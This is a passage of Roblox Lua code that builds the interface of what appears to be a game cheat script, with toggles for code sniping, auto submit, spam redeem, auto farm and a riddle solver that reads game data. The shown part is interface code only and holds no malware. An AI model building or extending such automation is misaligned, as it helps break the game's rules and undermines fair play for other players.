            Position=UDim2.fromOffset(0,11),BackgroundColor3=P.accent,
            BackgroundTransparency=1,BorderSizePixel=0,ZIndex=36}),3)
    end

    local header=mk("Frame",root,{Name="DragHeader",BackgroundTransparency=1,
        Position=UDim2.fromOffset(170,0),Size=UDim2.new(1,-170,0,73),
        Active=true,ZIndex=35})
    local upper=text(header,"CALCIUM  /  NOVA V15",9,P.accent,Enum.Font.GothamBold,
        {Position=UDim2.fromOffset(19,10),Size=UDim2.new(1,-140,0,16),ZIndex=36})
    local pageTitle=titleFont(text(header,"Dashboard",23,P.white,Enum.Font.GothamBlack,
        {Position=UDim2.fromOffset(17,29),Size=UDim2.new(1,-130,0,30),ZIndex=36}))
    local statusPill=curve(mk("Frame",header,{Size=UDim2.fromOffset(80,27),
        Position=UDim2.new(1,-126,0,25),BackgroundColor3=P.raised,BorderSizePixel=0,ZIndex=36}),13)
    local pillDot=curve(mk("Frame",statusPill,{Size=UDim2.fromOffset(7,7),
        Position=UDim2.fromOffset(12,10),BackgroundColor3=P.good,BorderSizePixel=0,ZIndex=37}),4)
    local pillText=text(statusPill,"LIVE",10,P.good,Enum.Font.GothamBold,
        {Position=UDim2.fromOffset(27,0),Size=UDim2.new(1,-30,1,0),ZIndex=37})
    edge(statusPill,P.stroke,.64,1)
    local minimize=button(header,"−",nil,false)
    minimize.Name="Minimize"
    minimize.Position=UDim2.new(1,-37,0,23)
    minimize.Size=UDim2.fromOffset(29,29)
    minimize.TextSize=21
    local workspaceShell=curve(mk("Frame",root,{Name="WorkspaceShell",
        Position=UDim2.fromOffset(177,70),Size=UDim2.new(1,-185,1,-77),
        BackgroundColor3=P.panel,BackgroundTransparency=.13,
        BorderSizePixel=0,ZIndex=31}),19)
    edge(workspaceShell,P.stroke,.82,1)
    local pagesWrap=mk("Frame",root,{Name="PageWorkspace",BackgroundTransparency=1,
        Position=UDim2.fromOffset(189,85),Size=UDim2.new(1,-201,1,-101),
        ClipsDescendants=true,ZIndex=32})
    local pages={}
    for _,item in ipairs(MENU) do
        local pg=mk("ScrollingFrame",pagesWrap,{Name=item[1],Size=UDim2.fromScale(1,1),
            BackgroundTransparency=1,BorderSizePixel=0,ScrollBarThickness=3,
            ScrollBarImageColor3=P.accent,CanvasSize=UDim2.fromOffset(0,0),
            AutomaticCanvasSize=Enum.AutomaticSize.Y,Visible=false,ZIndex=33})
        mk("UIPadding",pg,{PaddingTop=UDim.new(0,4),PaddingBottom=UDim.new(0,15),
            PaddingLeft=UDim.new(0,3),PaddingRight=UDim.new(0,7)})
        mk("UIListLayout",pg,{Padding=UDim.new(0,10),SortOrder=Enum.SortOrder.LayoutOrder})
        pages[item[1]]=pg
    end
    local function card(parent,height)
        local c=curve(mk("Frame",parent,{BackgroundColor3=P.panel,BackgroundTransparency=0,
            BorderSizePixel=0,Size=UDim2.new(1,-4,0,height),ZIndex=34}),17)
        edge(c,P.stroke,.67)
        shade(c,Color3.fromRGB(30,47,63),Color3.fromRGB(13,24,37),115)
        return c
    end
    local function section(parent,title)
        local c=mk("Frame",parent,{Size=UDim2.new(1,-4,0,27),BackgroundTransparency=1,ZIndex=34})
        curve(mk("Frame",c,{Position=UDim2.fromOffset(0,6),Size=UDim2.fromOffset(3,15),
            BackgroundColor3=P.accent,BorderSizePixel=0,ZIndex=35}),2)
        text(c,title:upper(),11,P.quiet,Enum.Font.GothamBold,
            {Position=UDim2.fromOffset(12,1),Size=UDim2.new(1,-12,0,24),ZIndex=35})
        return c
    end
    -- Each workspace gets a compact, purposeful visual header (rather than
    -- only the Settings page having recognizable panels).
    local spotlights={}
    local function pageSpotlight(parent,kicker,headline,mark)
        local art=curve(mk("Frame",parent,{Name="PageSpotlight",LayoutOrder=-100,
            Size=UDim2.new(1,-4,0,101),BackgroundColor3=P.card,
            BorderSizePixel=0,ClipsDescendants=true,ZIndex=34}),18)
        edge(art,P.accent,.65,1)
        shade(art,Color3.fromRGB(35,67,84),Color3.fromRGB(14,27,40),0)
        local strip=curve(mk("Frame",art,{Size=UDim2.fromOffset(5,45),
            Position=UDim2.fromOffset(15,27),BackgroundColor3=P.accent,
            BorderSizePixel=0,ZIndex=35}),5)
        text(art,kicker,10,P.accent,Enum.Font.GothamBold,{Position=UDim2.fromOffset(26,17),
            Size=UDim2.new(1,-102,0,21),ZIndex=36})
        titleFont(text(art,headline,21,P.white,Enum.Font.GothamBlack,
            {Position=UDim2.fromOffset(24,43),Size=UDim2.new(1,-125,0,33),ZIndex=36}))
        local stamp=curve(mk("Frame",art,{AnchorPoint=Vector2.new(1,.5),
            Position=UDim2.new(1,-20,.5,0),Size=UDim2.fromOffset(58,58),
            BackgroundColor3=P.accent,BackgroundTransparency=.89,
            BorderSizePixel=0,ZIndex=35}),20)
        edge(stamp,P.accent,.52,1)
        local markText=text(stamp,mark,25,P.accent,Enum.Font.GothamBlack,
            {Size=UDim2.fromScale(1,1),TextXAlignment=Enum.TextXAlignment.Center,ZIndex=36})
        spotlights[#spotlights+1]={strip=strip,frame=art,stamp=stamp,label=markText}
        return art
    end
    local refresh={}
    local themed={}
    local function track(obj,kind) themed[#themed+1]={obj=obj,kind=kind};return obj end
    local function group(parent,titles,entries)
        local height=10+#entries*48
        local c=card(parent,height)
        if titles then text(c,titles:upper(),10,P.dim,Enum.Font.GothamBold,
            {Position=UDim2.fromOffset(14,6),Size=UDim2.new(1,-28,0,15),ZIndex=35}) end
        for i,item in ipairs(entries) do
            local y=(i-1)*48+(titles and 19 or 0)
            if i>1 then
                mk("Frame",c,{Position=UDim2.fromOffset(13,y),Size=UDim2.new(1,-26,0,1),
                    BackgroundColor3=P.stroke,BackgroundTransparency=.79,BorderSizePixel=0,ZIndex=35})
            end
            local btn=mk("TextButton",c,{Position=UDim2.fromOffset(9,y+2),Size=UDim2.new(1,-18,0,43),
                BackgroundTransparency=1,AutoButtonColor=false,Text="",ZIndex=36})
            text(btn,item[1],12,P.white,Enum.Font.GothamBold,
                {Position=UDim2.fromOffset(7,0),Size=UDim2.new(1,-76,1,0),ZIndex=37})
            local switch=curve(mk("Frame",btn,{Size=UDim2.fromOffset(46,25),
                Position=UDim2.new(1,-56,.5,-12),BackgroundColor3=P.raised,BorderSizePixel=0,ZIndex=37}),13)
            local nub=curve(mk("Frame",switch,{Size=UDim2.fromOffset(17,17),
                Position=UDim2.fromOffset(4,4),BackgroundColor3=P.quiet,BorderSizePixel=0,ZIndex=38}),9)
            local last
            local function sync()
                if not btn.Parent then return end
                local v=item[2]() == true
                if v==last then return end
                last=v
                tw(switch,{BackgroundColor3=v and P.accent or P.raised},.17)
                tw(nub,{Position=v and UDim2.fromOffset(25,4) or UDim2.fromOffset(4,4),
                    BackgroundColor3=v and P.bg or P.quiet},.17)
            end
            btn.Activated:Connect(function()
                item[3](not item[2]())
                sync()
            end)
            refresh[#refresh+1]=sync
            sync()
        end
        return c
    end
    local function updateAll()
        for _,fn in ipairs(refresh) do pcall(fn) end
        local online=autoWriteEnabled==true
        local c=online and P.good or P.bad
        pillDot.BackgroundColor3=c
        pillText.Text=online and "LIVE" or "PAUSED"
        pillText.TextColor3=c
    end
    local function navigate(name)
        if not pages[name] then return end
        current=name
        for n,p in pairs(pages) do p.Visible=n==name end
        pageTitle.Text=({Home="Dashboard",Intel="Riddle Intel",Settings="Settings",Sniper="Sniper",Logs="Activity"})[name] or name
        for n,b in pairs(navButtons) do
            local selected=(n==name)
            tw(b,{BackgroundTransparency=selected and .03 or 1,
                BackgroundColor3=selected and P.raised or P.panel},.18)
            navLabels[n].TextColor3=selected and P.white or P.quiet
            navBars[n].BackgroundTransparency=selected and 0 or 1
        end
        updateAll()
    end
    for name,btn in pairs(navButtons) do
        btn.Activated:Connect(function() navigate(name) end)
        btn.MouseEnter:Connect(function()
            if current~=name then tw(btn,{BackgroundTransparency=.58},.14) end
        end)
        btn.MouseLeave:Connect(function()
            if current~=name then tw(btn,{BackgroundTransparency=1},.14) end
        end)
    end

    -- HOME: one clear engine action, a visual hero, and quick navigation.
    local home=pages.Home
    local hero=card(home,177)
    hero.ClipsDescendants=true
    local heroArt=mk("ImageLabel",hero,{Size=UDim2.fromScale(1,1),Image=DEFAULT_IMG,
        ScaleType=Enum.ScaleType.Crop,ImageTransparency=.44,BackgroundTransparency=1,ZIndex=35})
    curve(heroArt,17)
    local heroTint=mk("Frame",hero,{Size=UDim2.fromScale(1,1),
        BackgroundColor3=P.panel,BackgroundTransparency=.4,BorderSizePixel=0,ZIndex=36})
    shade(heroTint,Color3.fromRGB(7,20,33),Color3.fromRGB(12,37,52),0)
    text(hero,"PHANTOM  /  V11",10,P.accent,Enum.Font.GothamBold,
        {Position=UDim2.fromOffset(17,15),Size=UDim2.new(1,-36,0,18),ZIndex=39})
    titleFont(text(hero,"CODE SNIPER",23,P.white,Enum.Font.GothamBlack,
        {Position=UDim2.fromOffset(15,41),Size=UDim2.new(1,-40,0,32),ZIndex=39}))
    local heroLight=mk("Frame",hero,{Size=UDim2.fromOffset(104,2),
        Position=UDim2.fromOffset(18,84),BackgroundColor3=P.accent,
        BorderSizePixel=0,ZIndex=39})
    local crosshair=mk("Frame",hero,{AnchorPoint=Vector2.new(.5,.5),
        Position=UDim2.new(1,-77,0,78),Size=UDim2.fromOffset(100,100),
        BackgroundTransparency=1,ZIndex=38})
    curve(crosshair,52)
    local targetEdge=edge(crosshair,P.accent,.38,1.5)
    local bull=curve(mk("Frame",crosshair,{AnchorPoint=Vector2.new(.5,.5),
        Position=UDim2.fromScale(.5,.5),Size=UDim2.fromOffset(35,35),
        BackgroundTransparency=1,ZIndex=39}),23)
    edge(bull,P.accent,.42)
    local centerPoint=curve(mk("Frame",bull,{AnchorPoint=Vector2.new(.5,.5),
        Position=UDim2.fromScale(.5,.5),Size=UDim2.fromOffset(7,7),
        BackgroundColor3=P.accent,BorderSizePixel=0,ZIndex=40}),7)
    edge(centerPoint,P.white,.32,1)
    mk("Frame",crosshair,{Position=UDim2.new(.5,0,0,12),Size=UDim2.fromOffset(1,76),
        BackgroundColor3=P.accent,BackgroundTransparency=.4,BorderSizePixel=0,ZIndex=39})
    mk("Frame",crosshair,{Position=UDim2.new(0,12,.5,0),Size=UDim2.fromOffset(76,1),
        BackgroundColor3=P.accent,BackgroundTransparency=.4,BorderSizePixel=0,ZIndex=39})
    local engine=button(hero,"PAUSE SNIPER",function()
        setCodeSniperEnabled(not autoWriteEnabled)
        updateAll()
    end,true)
    track(engine,"primary")
    engine.Position=UDim2.fromOffset(16,119)
    engine.Size=UDim2.fromOffset(167,39)
    refresh[#refresh+1]=function()
        local v=autoWriteEnabled==true
        local str=v and "PAUSE SNIPER" or "START SNIPER"
        if engine.Text~=str then engine.Text=str end
    end
    local heroState=text(hero,"●  ACTIVE",10,P.good,Enum.Font.GothamBold,
        {Position=UDim2.new(1,-106,1,-47),Size=UDim2.fromOffset(100,23),ZIndex=39})
    refresh[#refresh+1]=function()
        heroState.Text=autoWriteEnabled and "●  ACTIVE" or "●  PAUSED"
        heroState.TextColor3=autoWriteEnabled and P.good or P.bad
    end

    section(home,"System")
    local live=card(home,90)
    local telemetry=text(live,"— ms",23,P.accent,Enum.Font.GothamBlack,
        {Position=UDim2.fromOffset(15,18),Size=UDim2.new(.45,-14,0,31),ZIndex=35})
    local teleLabel=text(live,"LOCAL DISPATCH",9,P.dim,Enum.Font.GothamBold,
        {Position=UDim2.fromOffset(17,57),Size=UDim2.new(.5,-20,0,18),ZIndex=35})
    local vertical=mk("Frame",live,{Size=UDim2.fromOffset(1,54),Position=UDim2.new(.5,0,0,17),
        BackgroundColor3=P.stroke,BackgroundTransparency=.63,BorderSizePixel=0,ZIndex=36})
    local linkValue=text(live,"SEARCHING",12,P.accent,Enum.Font.GothamBold,
        {Position=UDim2.new(.5,15,0,20),Size=UDim2.new(.5,-25,0,29),ZIndex=36})
    text(live,"CODEBOX LINK",9,P.dim,Enum.Font.GothamBold,
        {Position=UDim2.new(.5,15,0,55),Size=UDim2.new(.5,-22,0,18),ZIndex=36})
    local quick=card(home,89)
    text(quick,"QUICK ACCESS",10,P.dim,Enum.Font.GothamBold,
        {Position=UDim2.fromOffset(14,9),Size=UDim2.new(1,-25,0,18),ZIndex=35})
    local quickActions={{"SNIPER","Sniper"},{"INTEL","Intel"},{"LOGS","Logs"}}
    for i,v in ipairs(quickActions) do
        local b=button(quick,v[1].."  ›",function() navigate(v[2]) end)
        b.Position=UDim2.new((i-1)/3,10,0,39)
        b.Size=UDim2.new(1/3,-14,0,34)
        b.TextSize=10
    end

    -- SNIPER: grouped compact controls, no secondary descriptions.
    local sniper=pages.Sniper
    pageSpotlight(sniper,"AUTOMATION  /  01","Sniper Engine","01")
    section(sniper,"Engine")
    group(sniper,nil,{
        {"Code sniper",function()return autoWriteEnabled end,setCodeSniperEnabled},
        {"Auto submit",function()return _autoAccept end,setAutoSubmitEnabled},
        {"Spam redeem",function()return _spamRedeem end,function(on)
            _spamRedeem=on;savedConfig.spamRedeem=on;featureStates["Spam redeem"]=on
            saveConfig()
        end},
    })
    section(sniper,"Submission")
    local after=card(sniper,84)
    text(after,"SUBMIT AFTER",11,P.white,Enum.Font.GothamBold,
        {Position=UDim2.fromOffset(13,11),Size=UDim2.new(1,-120,0,22),ZIndex=35})
    local countText=text(after,"1 ANNOUNCEMENT",13,P.accent,Enum.Font.GothamBold,
        {Position=UDim2.fromOffset(13,37),Size=UDim2.new(1,-125,0,26),ZIndex=35})
    local announceRail=curve(mk("Frame",after,{Position=UDim2.fromOffset(14,73),
        Size=UDim2.new(1,-29,0,3),BackgroundColor3=P.raised,
        BorderSizePixel=0,ZIndex=35}),2)
    local announceFill=curve(mk("Frame",announceRail,{Size=UDim2.fromScale(0,1),
        BackgroundColor3=P.accent,BorderSizePixel=0,ZIndex=36}),2)
    local minus=button(after,"−",function() safeDecr() end)
    minus.Position=UDim2.new(1,-88,0,28);minus.Size=UDim2.fromOffset(33,33);minus.TextSize=19
    local plus=button(after,"+",function() safeIncr() end)
    plus.Position=UDim2.new(1,-48,0,28);plus.Size=UDim2.fromOffset(33,33);plus.TextSize=18
    refresh[#refresh+1]=function()
        local amount=tonumber(_submitAfter) or 1
        local newText=tostring(amount)..(amount==1 and " ANNOUNCEMENT" or " ANNOUNCEMENTS")
        if countText.Text~=newText then countText.Text=newText end
        local filled=math.min(1,(#_capturedParts or 0)/math.max(1,amount))
        announceFill.Size=UDim2.fromScale(filled,1)
    end
    local submit=button(sniper,"SUBMIT NOW",function()
        if type(manualSubmitNow)=="function" then pcall(manualSubmitNow) end
    end,true)
    submit.Size=UDim2.new(1,-4,0,42)
    track(submit,"primary")
    section(sniper,"Automation")
    group(sniper,nil,{
        {"Riddle solver",function()return _riddleSolver end,setRiddleSolverEnabled},
        {"Retype invalid",function()return _retypeInvalid end,setRetypeInvalidEnabled},
        {"Auto farm",function()return _autoFarm end,setAutoFarmEnabled},
    })

    -- INTEL: existing live solver; data is cached and non-blocking.
    local intelPage=pages.Intel
    pageSpotlight(intelPage,"ANALYSIS  /  02","Riddle Intel","02")
    local intelHeader=card(intelPage,65)
    local intelStatus=text(intelHeader,"SYNCING GAME DATA",12,P.accent,Enum.Font.GothamBold,
        {Position=UDim2.fromOffset(13,9),Size=UDim2.new(1,-26,0,21),ZIndex=35})
    local intelCounts=text(intelHeader,"—",11,P.quiet,Enum.Font.GothamMedium,
        {Position=UDim2.fromOffset(13,35),Size=UDim2.new(1,-26,0,18),ZIndex=35})
    local refreshBtn=button(intelPage,"REFRESH INTEL",function()
        LiveRiddleIntel.requestRefresh(true)
    end,true)
    track(refreshBtn,"primary")
    refreshBtn.Size=UDim2.new(1,-4,0,37)
    local ranks={}
    for _,e in ipairs({{"Brainrots","income","generation","/s"},
            {"Mutations","mutations","modifier","×"},
            {"Traits","traits","modifier","×"}}) do
        local c=card(intelPage,100)
        text(c,e[1]:upper(),11,P.accent,Enum.Font.GothamBold,
            {Position=UDim2.fromOffset(12,7),Size=UDim2.new(1,-25,0,21),ZIndex=35})
        local best=text(c,"BEST   —",12,P.white,Enum.Font.GothamBold,
            {Position=UDim2.fromOffset(13,34),Size=UDim2.new(1,-25,0,23),ZIndex=35})
        local worst=text(c,"WORST   —",11,P.quiet,Enum.Font.GothamMedium,
            {Position=UDim2.fromOffset(13,63),Size=UDim2.new(1,-25,0,22),ZIndex=35})
        ranks[#ranks+1]={key=e[2],field=e[3],suffix=e[4],best=best,worst=worst}
    end
    local diag=card(intelPage,48)
    local diagText=text(diag,"DATA SOURCE: WAITING",10,P.quiet,Enum.Font.GothamMedium,
        {Position=UDim2.fromOffset(12,9),Size=UDim2.new(1,-24,0,30),ZIndex=36,
         TextWrapped=true,TextTruncate=Enum.TextTruncate.None})
    section(intelPage,"Live animal data")
    local liveCard=card(intelPage,108)
    local latestText=text(liveCard,"LATEST   UNAVAILABLE",12,P.white,Enum.Font.GothamBold,
        {Position=UDim2.fromOffset(13,10),Size=UDim2.new(1,-26,0,25),ZIndex=36})
    local dataSourcesText=text(liveCard,"MODULES   CONNECTING",11,P.accent,Enum.Font.GothamBold,
        {Position=UDim2.fromOffset(13,39),Size=UDim2.new(1,-26,0,24),ZIndex=36})
    local observedText=text(liveCard,"NEW IN THIS SESSION   —",10,P.quiet,Enum.Font.GothamMedium,
        {Position=UDim2.fromOffset(13,70),Size=UDim2.new(1,-26,0,22),ZIndex=36})
    section(intelPage,"Riddle lookup")
    local riddleCard=card(intelPage,164)
    local riddleInput=curve(mk("TextBox",riddleCard,{Text="",PlaceholderText="Enter riddle...",
        PlaceholderColor3=P.dim,ClearTextOnFocus=false,TextColor3=P.white,
        TextXAlignment=Enum.TextXAlignment.Left,Font=Enum.Font.GothamMedium,TextSize=12,
        Size=UDim2.new(1,-24,0,38),Position=UDim2.fromOffset(12,11),
        BackgroundColor3=P.raised,BorderSizePixel=0,ZIndex=36}),9)
    mk("UIPadding",riddleInput,{PaddingLeft=UDim.new(0,10),PaddingRight=UDim.new(0,10)})
    local answer=text(riddleCard,"ANSWER  —",12,P.accent,Enum.Font.GothamBold,
        {Position=UDim2.fromOffset(13,108),Size=UDim2.new(1,-24,0,40),ZIndex=36})
    local riddleRun=button(riddleCard,"SOLVE RIDDLE",nil,true)
    riddleRun.Size=UDim2.new(1,-24,0,33)
    riddleRun.Position=UDim2.fromOffset(12,57)
    local riddleGeneration=0
    local riddleBusy=false
    local function testRiddle()
        local query=tostring(riddleInput.Text or ""):match("^%s*(.-)%s*$")
        if query=="" then answer.Text="ANSWER  —";return end
        if riddleBusy then return end
        riddleGeneration+=1
        local generation=riddleGeneration
        riddleBusy=true
        answer.Text="SOLVING..."
        riddleRun.Text="CHECKING..."
        task.spawn(function()
            -- Identical parser and local DB as the live riddle solver.
            -- AI is consulted only if local/replicated data cannot solve a part.
            local ok,result,_,reason=pcall(solveRiddle,query)
            if not riddleCard.Parent or generation~=riddleGeneration then return end
            local token=ok and type(result)=="string" and result:match("^%s*(.-)%s*$") or nil
            if token and token~="" then
                answer.Text="ANSWER  "..token
            else
                answer.Text=reason and tostring(reason):sub(1,85) or "NO VERIFIED MATCH"
            end
            riddleRun.Text="SOLVE RIDDLE"
            riddleBusy=false
        end)
    end
    riddleRun.Activated:Connect(testRiddle)
    riddleInput.FocusLost:Connect(function()
        -- Also works when the user taps away on mobile.
        task.defer(testRiddle)
    end)
    local function updateIntel()
        local intel=LiveRiddleIntel
        if intel.busy then intelStatus.Text="READING GAME DATA..."
        elseif intel.ready then
            local rr=intel.rankings or {}
            local complete=(rr.income and #rr.income>0 and rr.mutations and #rr.mutations>0
                and rr.traits and #rr.traits>0)
            intelStatus.Text=(complete and "RANKINGS READY" or "PARTIAL GAME DATA")
                .."  |  REV "..tostring(intel.version)
        else intelStatus.Text="NO REPLICATED METADATA" end
        local counts=intel.counts or {}
        local src=intel.sources or {}
        intelCounts.Text=("%d animals / %d mutations / %d traits | %s"):
            format(counts.animals or 0,counts.mutations or 0,counts.traits or 0,
                tostring(src.animals or "waiting"))
        latestText.Text=intel.latestAnimal and ("LATEST CANDIDATE  "..intel.latestAnimal)
            or "LATEST   UNAVAILABLE"
        -- * indicates the release metadata may cover only part of the catalog.
        if intel.latestSource and intel.latestSource:find("Complete",1,true) then
            latestText.Text="LATEST  "..intel.latestAnimal
        end
        local active={}
        for _,name in ipairs({"ANIMALS","MUTATIONS","TRAITS"}) do
            local tableName=name:lower()
            if type(intel[tableName])=="table" and next(intel[tableName]) then
                active[#active+1]=name
            end
        end
        dataSourcesText.Text=#active>0 and ("CONNECTED  "..table.concat(active,"  /  ")) or "WAITING FOR GAME MODULES"
        local src=intel.sources or {}
        if intel.lastError then
            diagText.Text=tostring(intel.lastError):sub(1,180)
        else
            diagText.Text="ANIMALS: "..tostring(src.animals).."  |  MUT: "..tostring(src.mutations).."  |  TRAITS: "..tostring(src.traits)
        end
        local new=intel.observedNew or {}
        observedText.Text=#new>0 and ("NEWLY OBSERVED   "..table.concat(new,", "))
            or "NEWLY OBSERVED   —"
        for _,r in ipairs(ranks) do
            local list=intel.rankings[r.key] or {}
            if #list>0 then
                local hi,lo=list[1],list[#list]
                local function formatRank(entry)
                    local n=entry[r.field]
                    return tostring(entry.name)..(type(n)=="number" and ("  ·  "..string.format("%.3g",n)..r.suffix) or "")
                end
                r.best.Text="BEST   "..formatRank(hi)
                r.worst.Text=r.key=="income" and "WORST RIDDLE   Noobini Pizzanini"
                    or ("WORST   "..formatRank(lo))
            else
                r.best.Text="BEST   —"
                r.worst.Text=r.key=="income" and "WORST RIDDLE   Noobini Pizzanini"
                    or "WORST   —"
            end
        end
    end
    LiveRiddleIntel.onUpdated=updateIntel
    updateIntel()

    -- SETTINGS: wallpapers, colors, title font, and hotkeys in one place.
    local settings=pages.Settings
    pageSpotlight(settings,"CUSTOMIZATION  /  03","Your Interface","03")
    section(settings,"Wallpapers")
    -- Same 20 gallery IDs as Calcium X Solar Confuser; thumbnail cards
    -- are selectable on touch/PC. The NONE tile removes wallpaper entirely.
    local confuserImageIds={"", "129085053275432", "126638309339233", "90211231416942",
        "138472956105442", "114535932585883", "133353928145895", "95372928362733",
        "82986133916631", "71086942427922", "116890020704841", "132870723653986",
        "140145334415261", "126519267203224", "73290556702979", "104138622888695",
        "90631990302263", "109619268613730", "88369503310562", "80708025126373",
        "135181794444219"}
    local imageButtons={}
    local applyWallpaper -- forward declaration: buttons are clicked after dock initialization
    local wallpaperOptions=card(settings,222)
    local bgCaption=text(wallpaperOptions,"GALLERY  /  20 BACKGROUNDS",10,P.dim,Enum.Font.GothamBold,
        {Position=UDim2.fromOffset(14,8),Size=UDim2.new(1,-28,0,19),ZIndex=35})
    local gallery=mk("ScrollingFrame",wallpaperOptions,{Name="ConfuserBackgroundGallery",
        Position=UDim2.fromOffset(12,34),Size=UDim2.new(1,-24,0,166),
        BackgroundTransparency=1,BorderSizePixel=0,ScrollBarThickness=3,
        ScrollBarImageColor3=P.accent,ScrollingDirection=Enum.ScrollingDirection.X,
        CanvasSize=UDim2.new(0,1140,0,0),ZIndex=36})
    mk("UIGridLayout",gallery,{FillDirection=Enum.FillDirection.Vertical,
        FillDirectionMaxCells=2,SortOrder=Enum.SortOrder.LayoutOrder,
        CellSize=UDim2.fromOffset(96,72),CellPadding=UDim2.fromOffset(8,8)})
    for i,id in ipairs(confuserImageIds) do
        local tile=curve(mk("ImageButton",gallery,{Name="Preset"..tostring(i),
            Image=id=="" and "" or "rbxassetid://"..id,
            ImageTransparency=id=="" and 1 or 0,
            BackgroundColor3=P.raised,Size=UDim2.fromOffset(96,72),
            ScaleType=Enum.ScaleType.Crop,BorderSizePixel=0,LayoutOrder=i,
            AutoButtonColor=false,ZIndex=37}),12)
        local tileBorder=edge(tile,P.stroke,.55,1.1)
        local tileFog=curve(mk("Frame",tile,{Size=UDim2.fromScale(1,1),
            BackgroundColor3=P.bg,BackgroundTransparency=.8,
            BorderSizePixel=0,ZIndex=38}),12)
        local tileName=id=="" and "NONE" or ("BG "..string.format("%02d",i-1))
        text(tile,tileName,10,P.white,Enum.Font.GothamBold,
            {Position=UDim2.new(0,0,1,-23),Size=UDim2.new(1,0,0,21),
                TextXAlignment=Enum.TextXAlignment.Center,ZIndex=39})
        imageButtons[id=="" and "NONE" or id]={tile=tile,border=tileBorder}
        tile.Activated:Connect(function()
            skin.wallpaper=id=="" and "NONE" or id
            persist()
            applyWallpaper()
        end)
    end
    local imageCustom=card(settings,77)
    text(imageCustom,"CUSTOM IMAGE ID",10,P.dim,Enum.Font.GothamBold,
        {Position=UDim2.fromOffset(12,5),Size=UDim2.new(1,-25,0,17),ZIndex=35})
    local imageInput=curve(mk("TextBox",imageCustom,{Text=skin.custom,
        PlaceholderText="Custom image ID",PlaceholderColor3=P.dim,
        Font=Enum.Font.GothamMedium,TextSize=12,TextColor3=P.white,
        TextXAlignment=Enum.TextXAlignment.Left,ClearTextOnFocus=false,
        BackgroundColor3=P.raised,BorderSizePixel=0,
        Position=UDim2.fromOffset(11,32),Size=UDim2.new(1,-108,0,34),ZIndex=35}),11)
    mk("UIPadding",imageInput,{PaddingLeft=UDim.new(0,10)})
    local applyImage=button(imageCustom,"APPLY",function()
        local value=tostring(imageInput.Text or "")
        local raw=value:match("^%s*rbxassetid://(%d+)%s*$") or value:match("^%s*(%d+)%s*$")
        if not raw then
            imageInput.PlaceholderText="Numbers only"
            return
        end
        skin.custom=raw;skin.wallpaper="CUSTOM";persist();applyWallpaper()
    end,true)
    track(applyImage,"primary")
    applyImage.Position=UDim2.new(1,-87,0,32);applyImage.Size=UDim2.fromOffset(75,34)
    local logoSettingsCard=card(settings,74)
    text(logoSettingsCard,"CALCIUM LOGO ASSET ID",10,P.dim,Enum.Font.GothamBold,
        {Position=UDim2.fromOffset(13,5),Size=UDim2.new(1,-25,0,18),ZIndex=35})
    local logoInput=curve(mk("TextBox",logoSettingsCard,{Text=tostring(skin.logo or "0"),
        PlaceholderText="Roblox logo image ID (0 = C)",PlaceholderColor3=P.dim,
        Font=Enum.Font.GothamMedium,TextSize=12,TextColor3=P.white,
        TextXAlignment=Enum.TextXAlignment.Left,ClearTextOnFocus=false,
        BackgroundColor3=P.raised,BorderSizePixel=0,
        Position=UDim2.fromOffset(11,30),Size=UDim2.new(1,-108,0,33),ZIndex=35}),12)
    mk("UIPadding",logoInput,{PaddingLeft=UDim.new(0,9)})
    -- Call the setter after the dock exists. The callback is never run at construction.
    local applyCalciumLogo
    local logoApply=button(logoSettingsCard,"APPLY",function()
        local raw=logoInput.Text:match("^%s*rbxassetid://(%d+)%s*$")
            or logoInput.Text:match("^%s*(%d+)%s*$")
        if not raw then logoInput.Text="0";raw="0" end
        skin.logo=raw;persist()
        if applyCalciumLogo then applyCalciumLogo() end
    end,true)
    logoApply.Position=UDim2.new(1,-87,0,30)
    logoApply.Size=UDim2.fromOffset(75,33)
    local opacityCard=card(settings,61)
    text(opacityCard,"IMAGE VISIBILITY",11,P.white,Enum.Font.GothamBold,
        {Position=UDim2.fromOffset(13,7),Size=UDim2.new(1,-164,0,25),ZIndex=35})
    local opacityValue=text(opacityCard,"",11,P.accent,Enum.Font.GothamBold,
        {Position=UDim2.fromOffset(13,30),Size=UDim2.new(1,-165,0,22),ZIndex=35})
    local lowerOpacity=button(opacityCard,"−",nil)
    lowerOpacity.Position=UDim2.new(1,-97,0,13)
    lowerOpacity.Size=UDim2.fromOffset(37,34)
    lowerOpacity.TextSize=19
    local raiseOpacity=button(opacityCard,"+",nil)
    raiseOpacity.Position=UDim2.new(1,-51,0,13)
    raiseOpacity.Size=UDim2.fromOffset(37,34)
    raiseOpacity.TextSize=18
    local function changeOpacity(n)
        skin.wallpaperOpacity=math.clamp((tonumber(skin.wallpaperOpacity) or .60)+n,.12,.90)
        persist();applyWallpaper()
    end
    lowerOpacity.Activated:Connect(function() changeOpacity(-.08) end)
    raiseOpacity.Activated:Connect(function() changeOpacity(.08) end)
    section(settings,"Accent")
    local accents=card(settings,63)
    local accentButtons={}
    for i,name in ipairs({"CYAN","ICE","SOLAR"}) do
        local b=button(accents,name,nil)
        b.Position=UDim2.new((i-1)/3,8,0,14)
        b.Size=UDim2.new(1/3,-12,0,35)
        accentButtons[name]=b
    end
    section(settings,"Typography")
    local fontCard=card(settings,55)
    text(fontCard,"STARBORN",13,P.white,Enum.Font.GothamBlack,
        {Position=UDim2.fromOffset(13,5),Size=UDim2.new(1,-26,0,23),ZIndex=35})
    fontStatus=text(fontCard,"LOADING LOCAL FONT",10,P.accent,Enum.Font.GothamMedium,
        {Position=UDim2.fromOffset(13,27),Size=UDim2.new(1,-26,0,18),ZIndex=35})
    group(settings,nil,{{"Starfield",function()return skin.particles end,function(v)
        skin.particles=v;stars.Visible=v;persist()
    end}})
    section(settings,"Hotkeys")
    local bindMap={{"Code sniper","kbCodeSniper"},{"Auto submit","kbAutoSubmit"},
        {"Riddle solver","kbRiddleSolver"},{"Retype invalid","kbRetypeInvalid"},
        {"Auto farm","kbAutoFarm"},{"Submit now","kbManualSubmit"}}
    local bindCard=card(settings,10+#bindMap*44)
    local listeningConn
    local listeningFor=nil
    for i,pair in ipairs(bindMap) do
        local display,key=pair[1],pair[2]
        local y=5+(i-1)*44
        text(bindCard,display,12,P.white,Enum.Font.GothamMedium,
            {Position=UDim2.fromOffset(13,y),Size=UDim2.new(1,-116,0,40),ZIndex=35})
        local bind=button(bindCard,tostring(savedConfig[key] or "NONE"),nil)
        bind.Position=UDim2.new(1,-103,0,y+5)
        bind.Size=UDim2.fromOffset(88,30)
        bind.TextSize=10
        refresh[#refresh+1]=function()
            if listeningFor~=key and bind.Parent then
                local value=tostring(savedConfig[key] or "NONE")
                if bind.Text~=value then bind.Text=value end
            end
        end
